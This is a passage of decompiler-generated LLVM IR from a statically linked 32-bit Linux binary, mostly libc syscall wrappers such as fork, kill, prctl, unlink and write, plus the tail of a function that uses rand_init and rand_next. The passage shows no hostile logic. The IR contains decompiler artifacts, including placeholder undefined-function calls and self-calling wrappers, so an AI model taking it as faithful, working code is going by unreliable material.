  uselistorder i32 %v2_80492a1, { 1, 0, 2 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 4, 0 }
  uselistorder i32* %edx.global-to-local, { 9, 10, 0, 1, 8, 3, 2, 4, 6, 5, 7, 11 }
  uselistorder i32* %eax.global-to-local, { 56, 57, 2, 0, 1, 83, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 16, 17, 14, 15, 82, 81, 18, 19, 20, 21, 80, 79, 22, 23, 24, 27, 28, 29, 25, 26, 30, 31, 32, 33, 34, 35, 36, 37, 78, 77, 38, 39, 55, 40, 41, 44, 42, 43, 45, 46, 49, 47, 48, 50, 51, 52, 53, 54, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 1, 0 }
  uselistorder i32 ()* @rand_next, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_init, { 2, 1, 0 }
  uselistorder i8** %argv, { 1, 0 }
  uselistorder label %dec_label_pc_8049881, { 1, 0 }
  uselistorder label %dec_label_pc_8049837, { 1, 0 }
  uselistorder label %dec_label_pc_80497a4, { 1, 0 }
  uselistorder label %dec_label_pc_804974f, { 1, 0 }
  uselistorder label %dec_label_pc_804973e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049735, { 1, 0 }
  uselistorder label %dec_label_pc_80496d1, { 1, 0 }
  uselistorder label %dec_label_pc_8049669, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049660, { 1, 0 }
  uselistorder label %dec_label_pc_80495bb, { 1, 0 }
  uselistorder label %dec_label_pc_804954d, { 1, 0 }
  uselistorder label %dec_label_pc_804952b, { 1, 0 }
  uselistorder label %dec_label_pc_8049474, { 1, 0 }
  uselistorder label %dec_label_pc_804944a, { 1, 0 }
  uselistorder label %dec_label_pc_80493ef, { 1, 0 }
  uselistorder label %dec_label_pc_80493ce, { 2, 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80498d4 = load i32, i32* @edi, align 4
  %v0_80498d5 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80498e9 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_80498f3 = icmp ugt i32 %v1_80498e9, 2
  br i1 %v6_80498f3, label %dec_label_pc_8049903, label %dec_label_pc_80498f5

dec_label_pc_80498f5:                             ; preds = %entry
  %v4_80498f9 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_80498e9)
  br label %dec_label_pc_8049925

dec_label_pc_8049903:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804990b = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804990b, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804990b, -4095
  br i1 %tmp17, label %dec_label_pc_8049923, label %dec_label_pc_8049917

dec_label_pc_8049917:                             ; preds = %dec_label_pc_8049903
  %v1_8049917 = call i32 @__errno_location(i32 %v0_80498d5)
  %v0_804991c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804991c = sub i32 0, %v0_804991c
  %v2_804991e = inttoptr i32 %v1_8049917 to i32*
  store i32 %v1_804991c, i32* %v2_804991e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049923

dec_label_pc_8049923:                             ; preds = %dec_label_pc_8049903, %dec_label_pc_8049917
  %v0_8049923 = phi i32 [ %v2_804990b, %dec_label_pc_8049903 ], [ -1, %dec_label_pc_8049917 ]
  br label %dec_label_pc_8049925

dec_label_pc_8049925:                             ; preds = %dec_label_pc_80498f5, %dec_label_pc_8049923
  %v0_804992a = phi i32 [ %v4_80498f9, %dec_label_pc_80498f5 ], [ %v0_8049923, %dec_label_pc_8049923 ]
  store i32 %v0_80498d5, i32* @ebx, align 4
  store i32 %v0_80498d4, i32* @edi, align 4
  ret i32 %v0_804992a

; uselistorder directives
  uselistorder i32 %v2_804990b, { 1, 0, 2 }
  uselistorder i32 %v0_80498d5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049925, { 1, 0 }
  uselistorder label %dec_label_pc_8049923, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804992c = load i32, i32* @edi, align 4
  store i32 %v0_804992c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8049944 = load i32, i32* @ebx, align 4
  %v1_804994c = call i32 @int80_syscall(i32 221)
  store i32 %v1_804994c, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804994c, -4095
  br i1 %tmp11, label %dec_label_pc_8049964, label %dec_label_pc_8049958

dec_label_pc_8049958:                             ; preds = %entry
  %v1_8049958 = call i32 @__errno_location(i32 %v0_8049944)
  %v0_804995d = load i32, i32* %edi.global-to-local, align 4
  %v1_804995d = sub i32 0, %v0_804995d
  %v2_804995f = inttoptr i32 %v1_8049958 to i32*
  store i32 %v1_804995d, i32* %v2_804995f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049964

dec_label_pc_8049964:                             ; preds = %entry, %dec_label_pc_8049958
  %v0_8049964 = phi i32 [ %v1_804994c, %entry ], [ -1, %dec_label_pc_8049958 ]
  %v2_8049969 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049969, i32* %edi.global-to-local, align 4
  ret i32 %v0_8049964

; uselistorder directives
  uselistorder i32 %v1_804994c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049964, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049994 = load i32, i32* @edi, align 4
  store i32 %v0_8049994, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804999c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80499a4 = call i32 @chdir(i32 %v0_804999c)
  store i32 %v0_804999c, i32* @ebx, align 4
  store i32 %v1_80499a4, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_80499a4, -4095
  br i1 %tmp8, label %dec_label_pc_80499bc, label %dec_label_pc_80499b0

dec_label_pc_80499b0:                             ; preds = %entry
  %v1_80499b0 = call i32 @__errno_location(i32 %v0_804999c)
  %v0_80499b5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80499b5 = sub i32 0, %v0_80499b5
  %v2_80499b7 = inttoptr i32 %v1_80499b0 to i32*
  store i32 %v1_80499b5, i32* %v2_80499b7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80499bc

dec_label_pc_80499bc:                             ; preds = %entry, %dec_label_pc_80499b0
  %v0_80499bc = phi i32 [ %v1_80499a4, %entry ], [ -1, %dec_label_pc_80499b0 ]
  %v2_80499be = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80499be, i32* @edx, align 4
  %v2_80499c0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80499c0, i32* @edi, align 4
  ret i32 %v0_80499bc

; uselistorder directives
  uselistorder i32 %v1_80499a4, { 1, 0, 2 }
  uselistorder i32 %v0_804999c, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80499bc, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80499c4 = load i32, i32* @edi, align 4
  store i32 %v0_80499c4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80499cc = load i32, i32* @ebx, align 4
  %v1_80499d4 = call i32 @close(i32 %arg1)
  store i32 %v0_80499cc, i32* @ebx, align 4
  store i32 %v1_80499d4, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_80499d4, -4095
  br i1 %tmp8, label %dec_label_pc_80499ec, label %dec_label_pc_80499e0

dec_label_pc_80499e0:                             ; preds = %entry
  %v1_80499e0 = call i32 @__errno_location(i32 %v0_80499cc)
  %v0_80499e5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80499e5 = sub i32 0, %v0_80499e5
  %v2_80499e7 = inttoptr i32 %v1_80499e0 to i32*
  store i32 %v1_80499e5, i32* %v2_80499e7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80499ec

dec_label_pc_80499ec:                             ; preds = %entry, %dec_label_pc_80499e0
  %v0_80499ec = phi i32 [ %v1_80499d4, %entry ], [ -1, %dec_label_pc_80499e0 ]
  %v2_80499f0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80499f0, i32* @edi, align 4
  ret i32 %v0_80499ec

; uselistorder directives
  uselistorder i32 %v1_80499d4, { 1, 0, 2 }
  uselistorder i32 %v0_80499cc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80499ec, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80499f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80499f4, i32* %stack_var_-4, align 4
  %v1_80499fd = call i32 @fork(i32 %v0_80499f4)
  store i32 %v1_80499fd, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_80499fd, -4095
  br i1 %tmp6, label %dec_label_pc_8049a14, label %dec_label_pc_8049a08

dec_label_pc_8049a08:                             ; preds = %entry
  %v0_8049a08 = load i32, i32* %stack_var_-4, align 4
  %v1_8049a08 = call i32 @__errno_location(i32 %v0_8049a08)
  %v0_8049a0d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049a0d = sub i32 0, %v0_8049a0d
  %v2_8049a0f = inttoptr i32 %v1_8049a08 to i32*
  store i32 %v1_8049a0d, i32* %v2_8049a0f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049a14

dec_label_pc_8049a14:                             ; preds = %entry, %dec_label_pc_8049a08
  %v0_8049a14 = phi i32 [ %v1_80499fd, %entry ], [ -1, %dec_label_pc_8049a08 ]
  %v2_8049a16 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049a16, i32* @edx, align 4
  %v2_8049a18 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049a18, i32* @ebx, align 4
  ret i32 %v0_8049a14

; uselistorder directives
  uselistorder i32 %v1_80499fd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049a14, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049a1c = load i32, i32* @ebx, align 4
  store i32 %v0_8049a1c, i32* %stack_var_-4, align 4
  %v1_8049a25 = call i32 @getpid(i32 %v0_8049a1c)
  store i32 %v1_8049a25, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8049a25, -4095
  br i1 %tmp6, label %dec_label_pc_8049a3c, label %dec_label_pc_8049a30

dec_label_pc_8049a30:                             ; preds = %entry
  %v0_8049a30 = load i32, i32* %stack_var_-4, align 4
  %v1_8049a30 = call i32 @__errno_location(i32 %v0_8049a30)
  %v0_8049a35 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049a35 = sub i32 0, %v0_8049a35
  %v2_8049a37 = inttoptr i32 %v1_8049a30 to i32*
  store i32 %v1_8049a35, i32* %v2_8049a37, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049a3c

dec_label_pc_8049a3c:                             ; preds = %entry, %dec_label_pc_8049a30
  %v0_8049a3c = phi i32 [ %v1_8049a25, %entry ], [ -1, %dec_label_pc_8049a30 ]
  %v2_8049a40 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049a40, i32* @ebx, align 4
  ret i32 %v0_8049a3c

; uselistorder directives
  uselistorder i32 %v1_8049a25, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049a3c, { 1, 0 }
}

define i32 @getppid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049a44 = load i32, i32* @ebx, align 4
  store i32 %v0_8049a44, i32* %stack_var_-4, align 4
  %v1_8049a4d = call i32 @getppid(i32 %v0_8049a44)
  store i32 %v1_8049a4d, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8049a4d, -4095
  br i1 %tmp6, label %dec_label_pc_8049a64, label %dec_label_pc_8049a58

dec_label_pc_8049a58:                             ; preds = %entry
  %v0_8049a58 = load i32, i32* %stack_var_-4, align 4
  %v1_8049a58 = call i32 @__errno_location(i32 %v0_8049a58)
  %v0_8049a5d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049a5d = sub i32 0, %v0_8049a5d
  %v2_8049a5f = inttoptr i32 %v1_8049a58 to i32*
  store i32 %v1_8049a5d, i32* %v2_8049a5f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049a64

dec_label_pc_8049a64:                             ; preds = %entry, %dec_label_pc_8049a58
  %v0_8049a64 = phi i32 [ %v1_8049a4d, %entry ], [ -1, %dec_label_pc_8049a58 ]
  %v2_8049a68 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049a68, i32* @ebx, align 4
  ret i32 %v0_8049a64

; uselistorder directives
  uselistorder i32 %v1_8049a4d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @getppid, { 1, 0 }
  uselistorder label %dec_label_pc_8049a64, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049a6c = load i32, i32* @ebx, align 4
  store i32 %v0_8049a6c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8049a7f = call i32 @kill(i32 %v0_8049a6c, i32 %tmp4)
  store i32 %v2_8049a7f, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_8049a7f, -4095
  br i1 %tmp8, label %dec_label_pc_8049a98, label %dec_label_pc_8049a8c

dec_label_pc_8049a8c:                             ; preds = %entry
  %v0_8049a8c = load i32, i32* %stack_var_-4, align 4
  %v1_8049a8c = call i32 @__errno_location(i32 %v0_8049a8c)
  %v0_8049a91 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049a91 = sub i32 0, %v0_8049a91
  %v2_8049a93 = inttoptr i32 %v1_8049a8c to i32*
  store i32 %v1_8049a91, i32* %v2_8049a93, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049a98

dec_label_pc_8049a98:                             ; preds = %entry, %dec_label_pc_8049a8c
  %v0_8049a98 = phi i32 [ %v2_8049a7f, %entry ], [ -1, %dec_label_pc_8049a8c ]
  %v2_8049a9a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049a9a, i32* @edx, align 4
  %v2_8049a9c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049a9c, i32* @ebx, align 4
  ret i32 %v0_8049a98

; uselistorder directives
  uselistorder i32 %v2_8049a7f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049a98, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049aa0 = load i32, i32* @edi, align 4
  %v0_8049aa1 = load i32, i32* @esi, align 4
  store i32 %v0_8049aa1, i32* %stack_var_-8, align 4
  %v0_8049ab9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8049ac1 = call i32 @prctl(i32 %v0_8049ab9, i32 %v0_8049aa1)
  store i32 %v0_8049ab9, i32* @ebx, align 4
  store i32 %v3_8049ac1, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_8049ac1, -4095
  br i1 %tmp11, label %dec_label_pc_8049ad9, label %dec_label_pc_8049acd

dec_label_pc_8049acd:                             ; preds = %entry
  %v1_8049acd = call i32 @__errno_location(i32 %v0_8049ab9)
  %v0_8049ad2 = load i32, i32* %esi.global-to-local, align 4
  %v1_8049ad2 = sub i32 0, %v0_8049ad2
  %v2_8049ad4 = inttoptr i32 %v1_8049acd to i32*
  store i32 %v1_8049ad2, i32* %v2_8049ad4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049ad9

dec_label_pc_8049ad9:                             ; preds = %entry, %dec_label_pc_8049acd
  %v0_8049ad9 = phi i32 [ %v3_8049ac1, %entry ], [ -1, %dec_label_pc_8049acd ]
  %v2_8049adc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049adc, i32* @esi, align 4
  store i32 %v0_8049aa0, i32* @edi, align 4
  ret i32 %v0_8049ad9

; uselistorder directives
  uselistorder i32 %v3_8049ac1, { 1, 0, 2 }
  uselistorder i32 %v0_8049ab9, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_8049ad9, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049ae1 = load i32, i32* @esi, align 4
  store i32 %v0_8049ae1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8049af9 = load i32, i32* @ebx, align 4
  %v1_8049b01 = call i32 @int80_syscall(i32 142)
  store i32 %v0_8049af9, i32* @ebx, align 4
  store i32 %v1_8049b01, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_8049b01, -4095
  br i1 %tmp11, label %dec_label_pc_8049b19, label %dec_label_pc_8049b0d

dec_label_pc_8049b0d:                             ; preds = %entry
  %v1_8049b0d = call i32 @__errno_location(i32 %v0_8049af9)
  %v0_8049b12 = load i32, i32* %esi.global-to-local, align 4
  %v1_8049b12 = sub i32 0, %v0_8049b12
  %v2_8049b14 = inttoptr i32 %v1_8049b0d to i32*
  store i32 %v1_8049b12, i32* %v2_8049b14, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049b19

dec_label_pc_8049b19:                             ; preds = %entry, %dec_label_pc_8049b0d
  %v0_8049b19 = phi i32 [ %v1_8049b01, %entry ], [ -1, %dec_label_pc_8049b0d ]
  %v2_8049b1c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049b1c, i32* @esi, align 4
  ret i32 %v0_8049b19

; uselistorder directives
  uselistorder i32 %v1_8049b01, { 1, 0, 2 }
  uselistorder i32 %v0_8049af9, { 1, 0 }
  uselistorder label %dec_label_pc_8049b19, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049b20 = load i32, i32* @edi, align 4
  store i32 %v0_8049b20, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_8049b28 = load i32, i32* @ebx, align 4
  %v2_8049b30 = call i32 @time(i32* %arg1)
  store i32 %v0_8049b28, i32* @ebx, align 4
  store i32 %v2_8049b30, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8049b30, -4095
  br i1 %tmp9, label %dec_label_pc_8049b48, label %dec_label_pc_8049b3c

dec_label_pc_8049b3c:                             ; preds = %entry
  %v1_8049b3c = call i32 @__errno_location(i32 %v0_8049b28)
  %v0_8049b41 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049b41 = sub i32 0, %v0_8049b41
  %v2_8049b43 = inttoptr i32 %v1_8049b3c to i32*
  store i32 %v1_8049b41, i32* %v2_8049b43, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049b48

dec_label_pc_8049b48:                             ; preds = %entry, %dec_label_pc_8049b3c
  %v0_8049b48 = phi i32 [ %v2_8049b30, %entry ], [ -1, %dec_label_pc_8049b3c ]
  %v2_8049b4a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049b4a, i32* @edx, align 4
  %v2_8049b4c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049b4c, i32* @edi, align 4
  ret i32 %v0_8049b48

; uselistorder directives
  uselistorder i32 %v2_8049b30, { 1, 0, 2 }
  uselistorder i32 %v0_8049b28, { 1, 0 }
  uselistorder label %dec_label_pc_8049b48, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049b50 = load i32, i32* @edi, align 4
  store i32 %v0_8049b50, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8049b58 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8049b60 = call i32 @unlink(i32 %v0_8049b58)
  store i32 %v0_8049b58, i32* @ebx, align 4
  store i32 %v1_8049b60, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8049b60, -4095
  br i1 %tmp8, label %dec_label_pc_8049b78, label %dec_label_pc_8049b6c

dec_label_pc_8049b6c:                             ; preds = %entry
  %v1_8049b6c = call i32 @__errno_location(i32 %v0_8049b58)
  %v0_8049b71 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049b71 = sub i32 0, %v0_8049b71
  %v2_8049b73 = inttoptr i32 %v1_8049b6c to i32*
  store i32 %v1_8049b71, i32* %v2_8049b73, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049b78

dec_label_pc_8049b78:                             ; preds = %entry, %dec_label_pc_8049b6c
  %v0_8049b78 = phi i32 [ %v1_8049b60, %entry ], [ -1, %dec_label_pc_8049b6c ]
  %v2_8049b7c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049b7c, i32* @edi, align 4
  ret i32 %v0_8049b78

; uselistorder directives
  uselistorder i32 %v1_8049b60, { 1, 0, 2 }
  uselistorder i32 %v0_8049b58, { 1, 0, 2 }
  uselistorder i32 (i32)* @unlink, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049b78, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8049b91 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_8049b91
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049b9c = load i32, i32* @edi, align 4
  store i32 %v0_8049b9c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8049bac = load i32, i32* @ebx, align 4
  %v4_8049bb4 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8049bac, i32* @ebx, align 4
  store i32 %v4_8049bb4, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_8049bb4, -4095
  br i1 %tmp11, label %dec_label_pc_8049bcc, label %dec_label_pc_8049bc0

dec_label_pc_8049bc0:                             ; preds = %entry
  %v1_8049bc0 = call i32 @__errno_location(i32 %v0_8049bac)
  %v0_8049bc5 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049bc5 = sub i32 0, %v0_8049bc5
  %v2_8049bc7 = inttoptr i32 %v1_8049bc0 to i32*
  store i32 %v1_8049bc5, i32* %v2_8049bc7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049bcc

dec_label_pc_8049bcc:                             ; preds = %entry, %dec_label_pc_8049bc0
  %v0_8049bcc = phi i32 [ %v4_8049bb4, %entry ], [ -1, %dec_label_pc_8049bc0 ]
  %v2_8049bce = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049bce, i32* @edx, align 4
  %v2_8049bd0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049bd0, i32* @edi, align 4
  ret i32 %v0_8049bcc

; uselistorder directives
  uselistorder i32 %v4_8049bb4, { 1, 0, 2 }
  uselistorder i32 %v0_8049bac, { 1, 0 }
  uselistorder label %dec_label_pc_8049bcc, { 1, 0 }
}

define i32 @__GI_toupper() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp, i32* @edx, align 4
  %v1_8049bd8 = add i32 %tmp, 128
  %v6_8049be3 = icmp ugt i32 %v1_8049bd8, 383
  br i1 %v6_8049be3, label %dec_label_pc_8049bee, label %dec_label_pc_8049be5

dec_label_pc_8049be5:                             ; preds = %entry
  %v0_8049be5 = load i32, i32* bitcast (i32** @global_var_8052040.27 to i32*), align 64
  %v2_8049bea = mul i32 %tmp, 2
  %v3_8049bea = add i32 %v0_8049be5, %v2_8049bea
  %v4_8049bea = inttoptr i32 %v3_8049bea to i16*
  %v5_8049bea = load i16, i16* %v4_8049bea, align 2
  %v6_8049bea = sext i16 %v5_8049bea to i32
  store i32 %v6_8049bea, i32* @edx, align 4
  br label %dec_label_pc_8049bee

dec_label_pc_8049bee:                             ; preds = %entry, %dec_label_pc_8049be5
  %v0_8049bee = phi i32 [ %tmp, %entry ], [ %v6_8049bea, %dec_label_pc_8049be5 ]
  ret i32 %v0_8049bee

; uselistorder directives
  uselistorder label %dec_label_pc_8049bee, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8052520.28 to i32)
}

define i32 @clock() local_unnamed_addr {
entry:
  %tmp = call i64 @__decompiler_undefined_function_4()
  %stack_var_-16 = alloca i32, align 4
  %v2_8049bff = ptrtoint i32* %stack_var_-16 to i32
  %v1_8049c04 = call i32 @times(i32 %v2_8049bff)
  %v4_8049c09 = trunc i64 %tmp to i32
  %v4_8049c0d = load i32, i32* %stack_var_-16, align 4
  %v5_8049c0d = add i32 %v4_8049c0d, %v4_8049c09
  %v3_8049c14 = mul i32 %v5_8049c0d, 10000
  %v1_8049c1a = and i32 %v3_8049c14, 2147483632
  ret i32 %v1_8049c1a
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8049c20 = load i32, i32* @edi, align 4
  %v4_8049c29 = ptrtoint i8* %arg1 to i32
  %v5_8049c2d = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8049c2d = ptrtoint i8* %v5_8049c2d to i32
  store i32 %v6_8049c2d, i32* @ecx, align 4
  store i32 %v0_8049c20, i32* @edi, align 4
  ret i32 %v4_8049c29

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8049c39 = ptrtoint i8* %arg1 to i32
  %v2_8049c41 = mul i32 %arg2, 256
  %v3_8049c41 = and i32 %v2_8049c41, 65280
  %v4_8049c41 = and i32 %arg2, -65281
  %v5_8049c41 = or i32 %v3_8049c41, %v4_8049c41
  %v8_8049c43.pre = load i1, i1* @df, align 1
  %v9_8049c43 = select i1 %v8_8049c43.pre, i32 -1, i32 1
  br label %dec_label_pc_8049c43

dec_label_pc_8049c43:                             ; preds = %dec_label_pc_8049c48, %entry
  %v4_8049c43 = phi i32 [ %v6_8049c43, %dec_label_pc_8049c48 ], [ %v5_8049c41, %entry ]
  %v7_8049c43 = phi i32 [ %v10_8049c43, %dec_label_pc_8049c48 ], [ %v4_8049c39, %entry ]
  %v1_8049c43 = inttoptr i32 %v7_8049c43 to i8*
